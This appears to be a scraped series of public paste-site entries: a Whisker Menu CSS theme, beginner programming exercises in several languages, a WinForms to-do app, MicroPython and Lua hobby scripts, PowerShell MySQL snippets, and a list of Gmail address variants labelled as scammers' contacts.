window.ssd headerbar.titlebar button.titlebutton {
    border-radius: 0;
    min-height: 0;
    margin-right: 2px;
    padding: 3px;
}
.tasklist button {
    border-width: 2px;
    border-style: solid;
}
.tasklist button {
    border-color: white;
    border-radius: 2px;
    margin-left: 4px;
}
.tasklist button:checked {
    border-color: cyan;
    border-radius: 2px;
    box-shadow: none;
}
.tasklist button:hover {
    border-color: white;
    border-radius: 2px;
}

/* Whisker Menu */
#whiskermenu-window {
    color: #000000;
    border-radius: 6px;
    background: #eef4f9;
    font-size: 14px;
    padding: 4px;
}
#whiskermenu-window border {
    border-color: transparent;
    border-width: 0px;
    border-radius: 6px;
    color: #000000;
    padding: 4px;
    box-shadow: inset 0px 0px 0px 1px #bcbcbc;
}
#whiskermenu-window separator {
    background-color: #bcbcbc;
}
#whiskermenu-window frame {
    margin-left: 40%;
}

/* Make sidebar buttons match */
#whiskermenu-window button {
    background-color: transparent;
    border-color: transparent;
    border-radius: 3px;
    color: #000000;
    padding: 0px;
    margin: 1px;
    font-size: 12px;
    box-shadow: none;
}
#whiskermenu-window button:hover {
    background: transparent;
    border: 1px solid #bcbcbc;
    color: #000000;
}
#whiskermenu-window button:active {
    background: transparent;
    border: 1px solid #bcbcbc;
    color: #000000;
}
#whiskermenu-window button:checked {
    background: transparent;
    border: 1px solid #bcbcbc;
    color: #000000;
}

/* Make treeview match */
#whiskermenu-window treeview {
    background: transparent;
    color: #000000;
    padding: 0px;
    margin: 1px;
    font-size: 12px;
    text-shadow: none;
}
#whiskermenu-window treeview:hover {
    background: transparent;
    border-radius: 3px;
    border: 1px solid #bcbcbc;
    color: #000000;
}
#whiskermenu-window .view,
iconview,
#whiskermenu-window .view text,
iconview text,
textview text {
    background-color: transparent;
    font-size: 12px;
}
#whiskermenu-window .view:hover,
iconview,
#whiskermenu-window .view:hover text,
iconview text,
textview text {
    background-color: rgba(192, 192, 192, 0.3);
    font-size: 12px;
    color: #3c3c3c;
}
#whiskermenu-window .frame {
    border: transparent;
    border-radius: 0px;
    color: #3c3c3c;
}

/* Menu search box */
#whiskermenu-window entry {
    background: rgba(255, 255, 255, 0.5);
    border-top: 1px solid #dcdcdc;
    border-bottom: 2px solid #398ee8;
    border-right: 1px solid #dcdcdc;
    border-left: 1px solid #dcdcdc;
    border-radius: 5px;
    color: #3c3c3c;
    font-size: 12px;
    text-shadow: none;
}

/* whiskermenu scrollbar */
#whiskermenu-window scrollbar {
    background: transparent;
    border-color: transparent;
}
#whiskermenu-window scrollbar:backdrop {
    background: transparent;
    border-color: transparent;
}
#whiskermenu-window scrollbar slider {
    min-width: 4px;
    min-height: 4px;
    margin: 2px;
    border: 1px solid #eef4f9;
    border-radius: 3px;
    background-clip: padding-box;
    background: #9c9c9c;
}
#whiskermenu-window scrollbar slider:hover {
    background: #6c6c6c;
    border-color: #6c6c6c;
}
#whiskermenu-window scrollbar slider:hover:active {
    background: #6c6c6c;
    border-color: #6c6c6c;
}
#whiskermenu-window scrollbar slider:backdrop {
    background: transparent;
}
#whiskermenu-window scrollbar slider:disabled {
    background: transparent;
}
"
1wszZEEQ,Count letters,Nikolay_Kashev,C#,Saturday 2nd of March 2024 02:03:19 PM CDT,"string text = Console.ReadLine();

int upperCount = 0;
int lowerCount = 0;
int spaceCount = 0;

foreach (char c in text)
{
    if (char.IsUpper(c))
        upperCount++;
    else if (char.IsLower(c))
        lowerCount++;
    else if (char.IsWhiteSpace(c))
        spaceCount++;
}

Console.WriteLine(upperCount);
Console.WriteLine(lowerCount);
Console.WriteLine(spaceCount);"
PenEwku4,Min/Max values in range,Nikolay_Kashev,C#,Saturday 2nd of March 2024 02:00:23 PM CDT,"int[] nums = Console.ReadLine().Split().Select(int.Parse).ToArray();

int start = int.Parse(Console.ReadLine());
int end = int.Parse(Console.ReadLine());

int max = int.MinValue;
int min = int.MaxValue;

for (int i = start; i <= end; i++)
{
    if (nums[i] > max)
        max = nums[i];

    if (nums[i] < min)
        min = nums[i];
}

int sum = max + min;
Console.WriteLine(sum);"
1Mi22Rda,To Do List,Kelly-B9978,C#,Saturday 2nd of March 2024 01:34:18 PM CDT,"using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace ToDoList
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            NameUpdate();
        }

        string filename = ""Untitled"";
        string todo_date, todo_task, todo_status;
        string current_date, current_task, current_status;
        string date_filter, todo_filter, filtered_task;

        private void Form1_Load(object sender, EventArgs e)
        {
            this.comboStatus.SelectedIndex = 3; // set default status เป็น Not Start
            this.comboFilter.SelectedIndex = 4; // set default filter เป็น All
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            todo_date = dateTimePicker1.Text;
            todo_task = txtTask.Text;
            todo_status = comboStatus.Text;

            if (todo_task == """") // check ถ้าช่อง task ไม่มีข้อความ ให้ขึ้นแจ้งเตือน
            {
                MessageBox.Show(""Please enter your task."",""To Do List"",MessageBoxButtons.OK,MessageBoxIcon.Warning);
            }
            else 
            {
                dgTask.Rows.Add(todo_date, todo_task, todo_status);
                FilterTask();
            }
            txtTask.Text = """"; // clear ค่าในช่อง task
        }

        int ComboMatch(string status_text)
        {
            switch (status_text)
            {
                case ""Completed"": return 0;
                case ""In Progress"": return 1;
                case ""Cancelled"": return 2;
                case ""Not Start"": return 3;
            } 
            return 4;
        }

        private void dgTask_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            if (dgTask.CurrentRow != null)
            {
                current_date = dgTask.CurrentRow.Cells[""Date""].Value.ToString();
                current_task = dgTask.CurrentRow.Cells[""Task""].Value.ToString();
                current_status = dgTask.CurrentRow.Cells[""Status""].Value.ToString();

                CultureInfo provider = CultureInfo.InvariantCulture; // set ให้ไม่สนใจ date format ของเครื่อง
                dateTimePicker1.Value = DateTime.ParseExact(current_date, ""dd/MM/yyyy"", provider);
                txtTask.Text = current_task;
                comboStatus.SelectedIndex = ComboMatch(current_status);
            }
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            todo_date = dateTimePicker1.Text;
            todo_task = txtTask.Text;
            todo_status = comboStatus.Text;

            if (dgTask.CurrentRow != null)
            {
                dgTask.CurrentRow.Cells[""Date""].Value = todo_date;
                dgTask.CurrentRow.Cells[""Task""].Value = todo_task;
                dgTask.CurrentRow.Cells[""Status""].Value = todo_status;
            }
            FilterTask();
        }

        private void btnDelete_Click(object sender, EventArgs e)
        {
            if (dgTask.CurrentRow != null)
            {
                dgTask.Rows.RemoveAt(dgTask.CurrentRow.Index);
                FilterTask();
            }
        }

        void FilterTask()
        {
            date_filter = dateTimePicker2.Text;
            todo_filter = comboFilter.Text;
            filtered_task = """";

            foreach (DataGridViewRow row in dgTask.Rows)
            {
                if (todo_filter == ""All"")
                {
                    if (row.Cells[""Date""].Value.ToString() == date_filter)
                    {
                        filtered_task += row.Cells[""Date""].Value.ToString() + ""   "" 
                            + row.Cells[""Task""].Value.ToString() + ""   "" 
                            + row.Cells[""Status""].Value.ToString() + ""\n"";
                    }
                } else
                {
                    if (row.Cells[""Status""].Value.ToString() == todo_filter && 
                        row.Cells[""Date""].Value.ToString() == date_filter)
                    {
                        filtered_task += row.Cells[""Date""].Value.ToString() + ""   "" 
                            + row.Cells[""Task""].Value.ToString() + ""   "" 
                            + row.Cells[""Status""].Value.ToString() + ""\n"";
                    }
                }
            }

            lblTaskFilter.Text = filtered_task;
        }

        private void dateTimePicker2_ValueChanged(object sender, EventArgs e)
        {
            FilterTask();
        }

        private void comboFilter_SelectedIndexChanged(object sender, EventArgs e)
        {
            FilterTask();
        }

        private void btnOpen_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.Filter = ""Text Files|*.txt"";
            openFileDialog1.Title = ""Open Text File"";
            openFileDialog1.ShowDialog();

            if (openFileDialog1.FileName != """")
            {
                filename = Path.GetFileName(openFileDialog1.FileName);
                dgTask.Rows.Clear();

                string[] lines = File.ReadAllLines(openFileDialog1.FileName);
                foreach (string line in lines)
                {
                    string[] cols = line.Split('\t');
                    dgTask.Rows.Add(cols[0], cols[1], cols[2]);
                }
            }

            NameUpdate();
            FilterTask();
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();
            saveFileDialog1.Filter = ""Text Files|*.txt"";
            saveFileDialog1.Title = ""Save as Text File"";
            saveFileDialog1.ShowDialog();

            if (saveFileDialog1.FileName != """")
            {
                using (StreamWriter writer = new StreamWriter(saveFileDialog1.FileName, false, Encoding.UTF8))
                {
                    foreach (DataGridViewRow row in dgTask.Rows)
                    {
                        string line = row.Cells[""Date""].Value + ""\t"" + row.Cells[""Task""].Value + ""\t"" + row.Cells[""Status""].Value;
                        writer.WriteLine(line);
                    }
                }

                filename = Path.GetFileName(saveFileDialog1.FileName);
            }

            NameUpdate();
        }

        void NameUpdate()
        {
            this.Text = ""To Do List - "" + filename;
        }
    }
}"
Ze3MtRRK,Untitled,Derga,C++,Saturday 2nd of March 2024 01:31:27 PM CDT,"#include <iostream>
#include <list>
#include <queue>
#include <vector>

using namespace std;

struct SegLengthPos {
    int length;
    int beg_pos;
    int operation_idx;
};

bool operator< (const SegLengthPos& lhs, const SegLengthPos& rhs) {
    if (lhs.length != rhs.length) return lhs.length > rhs.length;
    return lhs.beg_pos < rhs.beg_pos;
}

int main() {
    list<SegLengthPos> l;
    
    auto comparator = [](const list<SegLengthPos>::iterator& lhs, const list<SegLengthPos>::iterator& rhs) {
        return *lhs < *rhs;
    };

    priority_queue <list<SegLengthPos>::iterator, 
        vector<list<SegLengthPos>::iterator>, decltype(comparator)> pq(comparator);

    int memory_cells_count, requests_count;
    cin >> memory_cells_count >> requests_count;

    vector<list<SegLengthPos>::iterator> history(1 + requests_count);

    l.push_back({ memory_cells_count, 1 });
    pq.push(l.begin());
    
    for (int i = 1; i <= requests_count; ++i) {
        int operation;
        cin >> operation;

        if (operation > 0) {
            if (pq.top()->length < operation) {
                history[i] = l.end();
                cout << -1;
            } else {
                auto seg_data = *pq.top();
                auto it = l.erase(pq.top());
                pq.pop();
                if (it != l.end()) prev(it);
                auto it1 = l.insert(it, { seg_data.length - operation, seg_data.beg_pos + operation, i});
                pq.push(it1);

                history[i] = it1;
                cout << seg_data.beg_pos << '\n';
            }
            continue;
        }

        if (history[operation] == l.end()) continue;

        auto it = history[operation];
        auto [len, pos, op_odx] = *history[operation];
        history[operation] = l.end();

        auto l_it = it;
        auto r_it = it;
        if (l_it != l.begin()) prev(l_it);
        if (r_it != l.end()) next(r_it);

        if (r_it != l.end() && it->beg_pos + it->length == r_it->beg_pos) {
            it->length += r_it->length;
            history[r_it->operation_idx] = l.end();
            l.erase(r_it);
        }
        if (l_it != it && l_it->beg_pos + l_it->length == it->beg_pos) {
            l_it->length += it->length;
            history[it->operation_idx] = l.end();
            l.erase(it);
        }
    }

    return 0;
}"
nv64gsmp,4chat USER IDS,Ferrioz,JSON,Saturday 2nd of March 2024 01:28:17 PM CDT,"[
    {
        ""id0"": [
            {
                ""id"": 0,
                ""name"": ""Ferrioz""
            }
       ]
    },
    {
        ""id1"": [
            {
                ""id"": 1,
                ""name"": ""Egawn""
            }
        ]
    }
]"
Xpsuq35k,Untitled,a_chn,Java,Saturday 2nd of March 2024 01:15:24 PM CDT,"import java.util.*;
import java.io.*;
class a{
    public static void main (String args []) throws IOException{
        Scanner s = new Scanner (System.in);
        int numcases = Integer.parseInt(s.nextLine());
        long[] output = new long[numcases];
        for(int i = 0; i<numcases; i++){
            int numcows = Integer.parseInt(s.nextLine());
            String[] temp = s.nextLine().split("" "");
            ArrayList<Long> values = new ArrayList<>();
            for(int j = 0; j<numcows; j++){
                values.add(j,Long.parseLong(temp[j]));
            }
            long answer = 0;
            long counter = 0;
            for(int j = 1; j<numcows-1; j++){
                if(values.get(j) > values.get(j-1)){
                    long thing = values.get(j)-values.get(j-1);
                    values.set(j,values.get(j)-thing);
                    values.set(j+1,values.get(j+1)-thing);
                    counter += thing*2;
 
                }
            }
            if(numcows == 1) {
                System.out.println(0);
                continue;
            }
            if(values.get(numcows-2) < values.get(numcows-1) || values.get(0) < 0){
                System.out.println(-1);
                continue;
            }
            Collections.reverse(values);
            for(int j = 1; j<numcows-1; j++){
                if(values.get(j) > values.get(j-1)){
                    long thing = values.get(j)-values.get(j-1);
                    values.set(j,values.get(j)-thing);
                    values.set(j+1,values.get(j+1)-thing);
                    counter += thing*2;
 
 
                }
            }
            if(numcows == 1){
                answer = 0;
            }
            else if(numcows == 2 && values.get(0) != values.get(1)){
                answer = -1;
            }
            else if(values.get(numcows-2) < values.get(numcows-1) || values.get(0) < 0){
                answer = -1;
            }
            else{
                answer = counter;
            }
            System.out.println(answer);
        }
 
    }
}
"
WPERXTQ7,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 12:13:13 PM CDT,"#include <iostream>
#include <vector>
using namespace std;
int main() {
    int n, q;
    cin >> n >> q;
    
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    int queries[q];
    for(int i = 0; i < q; i++) {
        cin >> queries[i];
    }
    vector<int> v(55, -1);
    for(int i = 0; i < n; i++) {
        if(v[niza[i]] == -1) {
            v[niza[i]] = i + 1;
        }
    }
    for(int i = 0; i < q; i++) {
        int x = queries[i];
        cout << v[x] << "" "";
        for(int j = 1; j <= 50; j++) {
            if(v[j] < v[x] and v[j] != -1) {
                v[j]++;
            }
        }
        v[x] = 1;
    }
    
    
    return 0;
}

// 89 145 42 20 4 16 37 58
"
gM8zSSma,Untitled,BobbyGeorgiev,C#,Saturday 2nd of March 2024 12:02:03 PM CDT,"string text = Console.ReadLine();


int countLower = 0;
int countUpper = 0;
int countWhiteSpace = 0;


for  (int i = 0; i < text.Length; i++)
{
    char currentChar = text[i];
    if (Char.IsUpper(currentChar))
    {
        countUpper++;
    }
    else if (Char.IsLower(currentChar))
    {
        countLower++;
    }
    else if (Char.IsWhiteSpace(currentChar))  
    { 
        countWhiteSpace++; 
    }
}
Console.WriteLine(countUpper);
Console.WriteLine(countLower);
Console.WriteLine(countWhiteSpace);"
pJnmbF0N,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:46:00 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    vector<int> v;
    for(int i = 0; i < 100; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        
        v.push_back(p);
        p = sleden_broj;
        if(i + 1 == n) {
            cout << p << endl;
            return 0;
        }
    }
    vector<int> reps;
    for(int i = 0; i < v.size(); i++) {
        int se_povtoruva = -1;
        for(int j = i + 1; j < v.size(); j++) {
            if(v[i] == v[j]) {
                se_povtoruva = j - 1;
                break;
            }
        }
        if(se_povtoruva != -1) {
            for(int j = i; j <= se_povtoruva; j++) {
                
                reps.push_back(v[j]);
            }
            n -= i;
            break;
        }
    }
    int sz = reps.size();
    if(n % sz == 0) {
        cout << reps[sz - 1] << endl;
    }
    else {
        cout << reps[n % sz] << endl;
    }
    return 0;
}

// 89 145 42 20 4 16 37 58
"
mLh2UC3J,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:38:18 AM CDT,"# Logic

result = ''

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:

        result += f'Result: {user_input * 2:.2f};'  # Concatenate current result with new result
                                                    # With ; for delimiter
    else:
        result += 'Negative number!'
        break

# Print output
single_results = result.split(';') # Split all the results by delimiter
# single_result is a collection of all results with index and we can iterate this collection
for i in range(len(single_results)):
    print(single_results[i])
                                    
"
RVuVhYnG,VPN COMPOSE,alice_killer,Bash,Saturday 2nd of March 2024 11:31:52 AM CDT,"SUBNET=10.2.0.0/24
UNBOUND_IPV4_ADDRESS=10.2.0.200
PIHOLE_IPV4_ADDRESS=10.2.0.100

1. Set two Pihole DNS - 127.0.0.1, 10.2.0.200
2. SET VPN DNS as Pihole's IP - 10.2.0.100
"
v9dGWsRr,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:31:30 AM CDT,"

result_list = [] # create empty list

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:
        result_list.append(f'Result: {user_input * 2:.2f}')  # Append result to result list
    else:
        result_list.append('Negative number!')
        break

for i in range(len(result_list)):
    print(result_list[i])"
UzB4kEwJ,"LED animation using micropython, shift registers, and a timer.",lostogre,Python,Saturday 2nd of March 2024 11:29:15 AM CDT,"#              .';:cc;.
#            .,',;lol::c.
#            ;';lddddlclo
#            lcloxxoddodxdool:,.
#            cxdddxdodxdkOkkkkkkkd:.
#          .ldxkkOOOOkkOO000Okkxkkkkx:.
#        .lddxkkOkOOO0OOO0000Okxxxxkkkk:
#       'ooddkkkxxkO0000KK00Okxdoodxkkkko
#      .ooodxkkxxxOO000kkkO0KOxolooxkkxxkl
#      lolodxkkxxkOx,.      .lkdolodkkxxxO.
#      doloodxkkkOk           ....   .,cxO;
#      ddoodddxkkkk:         ,oxxxkOdc'..o'
#      :kdddxxxxd,  ,lolccldxxxkkOOOkkkko,
#       lOkxkkk;  :xkkkkkkkkOOO000OOkkOOk.
#        ;00Ok' 'O000OO0000000000OOOO0Od.
#         .l0l.;OOO000000OOOOOO000000x,
#            .'OKKKK00000000000000kc.
#               .:ox0KKKKKKK0kdc,.
#                      ...
#
# Author: peppe8o
# Blog: https://peppe8o.com
# Date: Aug 26th, 2021
# Version: 1.0

from machine import Pin, Timer
import random

#define PINs according to cabling
dataPIN = 19
latchPIN = 17
clockPIN = 18

#set pins to output PIN objects
dataPIN=Pin(dataPIN, Pin.OUT)
latchPIN=Pin(latchPIN, Pin.OUT)
clockPIN=Pin(clockPIN, Pin.OUT)

bit_string=""0000000000000000""

#define shift register update function
def shift_update(tim):

    # get the previously defined global values.
    global bit_string
    global dataPIN
    global clockPIN
    global latchPIN

    #put latch down to start data sending
    clockPIN.value(0)
    latchPIN.value(0)
    clockPIN.value(1)
  
    #load data in reverse order
    for i in range(15, -1, -1):
        clockPIN.value(0)
        dataPIN.value(int(bit_string[i]))
        clockPIN.value(1)

    #put latch up to store data on register
    clockPIN.value(0)
    latchPIN.value(1)
    clockPIN.value(1)

    bit_string = str(random.randint(0, 1))+bit_string[:-1]

def main():

    #start the timer, calling shift register function as a callback
    Timer(-1).init(period=100, mode=Timer.PERIODIC, callback=shift_update)
    
if __name__==""__main__"":
    main()

"
5HQW5wC1,Net Extender,Alexr360,Lua,Saturday 2nd of March 2024 11:28:56 AM CDT,"-- Initialize modem
local modem = peripheral.find(""modem"")
if not modem then
  print(""No modem found"")
  return
end
modem.open(os.getComputerID()) -- Open modem on computer ID

-- Main loop
while true do
  local event, modemSide, senderChannel, replyChannel, message, distance = os.pullEvent(""modem_message"")
  print(""Received message:"")
  print(""  Sender: "" .. senderChannel)
  print(""  Message: "" .. tostring(message))
end
"
VLwWfm42,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:24:50 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    for(int i = 0; i < n; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        p = sleden_broj;
    
    }
    cout << p << endl;
    return 0;
}
"
suswTqCt,Untitled,dllbridge,C,Saturday 2nd of March 2024 11:07:55 AM CDT,"

#include   <stdio.h>


char sz[99]; 


////////////////////////////////////////////////////////
int main()
{
	
	for(int i = 0; i < 5; i++)
	{
		
	    sz[i] = 104 + i;	
	}

	printf(sz);   
	
	 	  
return 0;
}
                         















/*


#include   <stdio.h>


char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
	sz[2] = 'Z';

    printf(""sz[0] = %c \n"", sz[0]); 	 
    printf(""sz[1] = %c \n"", sz[1]);   
    printf(""sz[2] = %c \n"", sz[2]); 	 
    printf(""sz[3] = %c \n"", sz[3]); 
    sz[1] = 'b';
	printf(sz);    	  
return 0;
}
                         

*/













/*

#include   <stdio.h>


int n1 = 43,  //  l;k dgkl;  ;kfdlk dgfl;k   
    n2 = 44;  //  lkjkljsdlk klsj fkl jaskldf 
    
char c = '$';   

char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""size of c = %d\n"", sizeof(c)); 	
    printf(""        c = %c\n"",        c ); 	
    printf(""       sz = %s\n"",        sz); 	 
    
return 0;
}

*/















/*
#include   <stdio.h>
#include  <locale.h>       //  здесь ""живёт"" setlocale(LC_ALL, ""rus"");

int n1 = 43, 
    n2 = 44;


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""n = %d\n"", n1 - n2); 	
  
 
    
return 0;
}
"
S5y9NTsj,classConstructor.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 10:59:49 AM CDT,"Add-Type -TypeDefinition @'
public class DbzCharacter {
    public int Id { get; set; }
    public string Name{ get; set; }
    public int SuperSaiyanLevel { get; set; }
    public string SpecialMove{ get; set; }

    public DbzCharacter(int id, string name, int superSaiyanLevel, string specialMove) {
    this.Id = id;
    this.Name = name;
    this.SuperSaiyanLevel = superSaiyanLevel;
    this.SpecialMove = specialMove;
    }
}
'@

$Person2 = [DbzCharacter]::new(1, ""Goku"", 3, ""Kamehameha"")
$Person3 = [DbzCharacter]::new(2, ""Tony"", 99, ""Montana"")

$Person2
$Person3"
9Z4tMVWt,fflag,AzurEXb,C++,Saturday 2nd of March 2024 10:30:52 AM CDT,"{ ""DFIntGameNetPVHeaderTranslationZeroCutoffExponent"": ""10"" }"
qE9ZEPqH,browseTableValueSQL.ps1,Combreal,PowerShell,Saturday 2nd of March 2024 10:30:27 AM CDT,"#Requieres MySQL Connector NET 8.3.0 and SimplySql Powershell Module

[void][system.reflection.Assembly]::LoadFrom(""C:\Program Files (x86)\MySQL\MySQL Connector NET 8.3.0\MySql.Data.dll"")

$Mysqlhost= ""localhost""
$Mysqluser= ""root""
$Mysqlpass= ""myrootpswd""
$Mysqldatabase= ""mydb""

$Connection = [MySql.Data.MySqlClient.MySqlConnection]@{ConnectionString=""server=$Mysqlhost;uid=$Mysqluser;pwd=$Mysqlpass;database=$Mysqldatabase""}
$Connection.Open()
$sql = New-Object MySql.Data.MySqlClient.MySqlCommand
$sql.Connection = $Connection

$sql.CommandText = ""SELECT title FROM recipes""
$myreader = $sql.ExecuteReader()
while($myreader.Read()) {
    $myreader.GetString(0)
}
$myreader.Close()

$sql.CommandText = ""SELECT full_name FROM users""
$myreader = $sql.ExecuteReader()
while($myreader.Read()) {
    $myreader.GetString(0)
}
$myreader.Close()

$Connection.Close()"
ycpMPY92,Nigerian scammers [2-3-2/2024],bombaires,AIMMS,Saturday 2nd of March 2024 10:21:05 AM CDT,"<a href=""mailto:worldbankcomp893@gmail.com"">worldbankcomp893@gmail.com</a>
<a href=""mailto:wo.r.ldbank.comp8.9.3@gmail.com"">wo.r.ldbank.comp8.9.3@gmail.com</a>
<a href=""mailto:w.or.l.d.ban.kc.omp89.3@gmail.com"">w.or.l.d.ban.kc.omp89.3@gmail.com</a>
<a href=""mailto:w.or.l.d.ba.n.kc.o.mp.89.3@gmail.com"">w.or.l.d.ba.n.kc.o.mp.89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.d.b.a.nkc.omp8.93@gmail.com"">w.o.r.l.d.b.a.nkc.omp8.93@gmail.com</a>
<a href=""mailto:w.o.rldba.nkc.om.p8.93@gmail.com"">w.o.rldba.nkc.om.p8.93@gmail.com</a>
<a href=""mailto:wo.rl.db.ank.co.m.p8.9.3@gmail.com"">wo.rl.db.ank.co.m.p8.9.3@gmail.com</a>
<a href=""mailto:w.orld.ba.nk.co.mp.8.9.3@gmail.com"">w.orld.ba.nk.co.mp.8.9.3@gmail.com</a>
<a href=""mailto:w.o.r.l.d.bank.co.m.p8.93@gmail.com"">w.o.r.l.d.bank.co.m.p8.93@gmail.com</a>
<a href=""mailto:worl.d.ba.n.k.co.m.p89.3@gmail.com"">worl.d.ba.n.k.co.m.p89.3@gmail.com</a>
<a href=""mailto:w.orl.d.bankcom.p893@gmail.com"">w.orl.d.bankcom.p893@gmail.com</a>
<a href=""mailto:wo.rl.d.ban.k.c.o.mp8.93@gmail.com"">wo.rl.d.ban.k.c.o.mp8.93@gmail.com</a>
<a href=""mailto:wo.r.l.d.ba.n.k.co.m.p89.3@gmail.com"">wo.r.l.d.ba.n.k.co.m.p89.3@gmail.com</a>
<a href=""mailto:w.or.ld.b.ankc.omp8.9.3@gmail.com"">w.or.ld.b.ankc.omp8.9.3@gmail.com</a>
<a href=""mailto:w.or.ld.ba.nkcom.p.8.93@gmail.com"">w.or.ld.ba.nkcom.p.8.93@gmail.com</a>
<a href=""mailto:wor.ldb.a.nk.comp.89.3@gmail.com"">wor.ldb.a.nk.comp.89.3@gmail.com</a>
<a href=""mailto:w.o.rl.dbankco.m.p8.93@gmail.com"">w.o.rl.dbankco.m.p8.93@gmail.com</a>
<a href=""mailto:wor.ldb.ank.com.p.893@gmail.com"">wor.ldb.ank.com.p.893@gmail.com</a>
<a href=""mailto:worl.d.ba.n.k.c.om.p8.93@gmail.com"">worl.d.ba.n.k.c.om.p8.93@gmail.com</a>
<a href=""mailto:w.o.rl.dbank.com.p8.93@gmail.com"">w.o.rl.dbank.com.p8.93@gmail.com</a>
<a href=""mailto:w.o.rldb.ankco.m.p89.3@gmail.com"">w.o.rldb.ankco.m.p89.3@gmail.com</a>
<a href=""mailto:worldb.ankc.o.m.p89.3@gmail.com"">worldb.ankc.o.m.p89.3@gmail.com</a>
<a href=""mailto:w.orl.d.bank.c.om.p89.3@gmail.com"">w.orl.d.bank.c.om.p89.3@gmail.com</a>
<a href=""mailto:w.or.l.db.an.kcom.p.8.9.3@gmail.com"">w.or.l.db.an.kcom.p.8.9.3@gmail.com</a>
<a href=""mailto:w.orld.b.a.nk.com.p893@gmail.com"">w.orld.b.a.nk.com.p893@gmail.com</a>
<a href=""mailto:w.o.rld.ba.n.k.co.m.p.8.9.3@gmail.com"">w.o.rld.ba.n.k.co.m.p.8.9.3@gmail.com</a>
<a href=""mailto:wor.l.db.a.nk.comp893@gmail.com"">wor.l.db.a.nk.comp893@gmail.com</a>
<a href=""mailto:worl.d.bank.com.p.8.93@gmail.com"">worl.d.bank.com.p.8.93@gmail.com</a>
<a href=""mailto:w.or.ldban.kco.m.p.8.93@gmail.com"">w.or.ldban.kco.m.p.8.93@gmail.com</a>
<a href=""mailto:wor.l.db.a.n.kc.omp.8.9.3@gmail.com"">wor.l.db.a.n.kc.omp.8.9.3@gmail.com</a>
<a href=""mailto:wo.rld.b.an.k.c.om.p.89.3@gmail.com"">wo.rld.b.an.k.c.om.p.89.3@gmail.com</a>
<a href=""mailto:wo.rldba.nk.c.o.m.p.8.93@gmail.com"">wo.rldba.nk.c.o.m.p.8.93@gmail.com</a>
<a href=""mailto:worl.dba.n.k.c.omp.8.93@gmail.com"">worl.dba.n.k.c.omp.8.93@gmail.com</a>
<a href=""mailto:w.o.r.ldban.kc.om.p.893@gmail.com"">w.o.r.ldban.kc.om.p.893@gmail.com</a>
<a href=""mailto:worl.d.b.a.n.kcom.p8.93@gmail.com"">worl.d.b.a.n.kcom.p8.93@gmail.com</a>
<a href=""mailto:w.orl.db.a.nk.c.omp8.93@gmail.com"">w.orl.db.a.nk.c.omp8.93@gmail.com</a>
<a href=""mailto:wor.ldb.a.n.k.comp.893@gmail.com"">wor.ldb.a.n.k.comp.893@gmail.com</a>
<a href=""mailto:w.o.rl.d.b.a.nk.co.mp.89.3@gmail.com"">w.o.rl.d.b.a.nk.co.mp.89.3@gmail.com</a>
<a href=""mailto:w.or.l.db.a.nk.co.mp.89.3@gmail.com"">w.or.l.db.a.nk.co.mp.89.3@gmail.com</a>
<a href=""mailto:wo.r.l.db.an.kc.om.p.8.9.3@gmail.com"">wo.r.l.db.an.kc.om.p.8.9.3@gmail.com</a>
<a href=""mailto:w.or.ldb.ank.c.omp.8.9.3@gmail.com"">w.or.ldb.ank.c.omp.8.9.3@gmail.com</a>
<a href=""mailto:w.o.rld.b.a.nkcomp893@gmail.com"">w.o.rld.b.a.nkcomp893@gmail.com</a>
<a href=""mailto:wor.ld.b.a.nkcom.p89.3@gmail.com"">wor.ld.b.a.nkcom.p89.3@gmail.com</a>
<a href=""mailto:w.o.r.l.dba.nk.c.o.mp893@gmail.com"">w.o.r.l.dba.nk.c.o.mp893@gmail.com</a>
<a href=""mailto:world.b.a.nk.c.om.p89.3@gmail.com"">world.b.a.nk.c.om.p89.3@gmail.com</a>
<a href=""mailto:wo.r.ldba.nkc.om.p.89.3@gmail.com"">wo.r.ldba.nkc.om.p.89.3@gmail.com</a>
<a href=""mailto:w.or.ldba.n.kc.o.mp893@gmail.com"">w.or.ldba.n.kc.o.mp893@gmail.com</a>
<a href=""mailto:world.ba.nk.c.om.p.89.3@gmail.com"">world.ba.nk.c.om.p.89.3@gmail.com</a>
<a href=""mailto:w.or.ldb.a.nkcomp.893@gmail.com"">w.or.ldb.a.nkcomp.893@gmail.com</a>
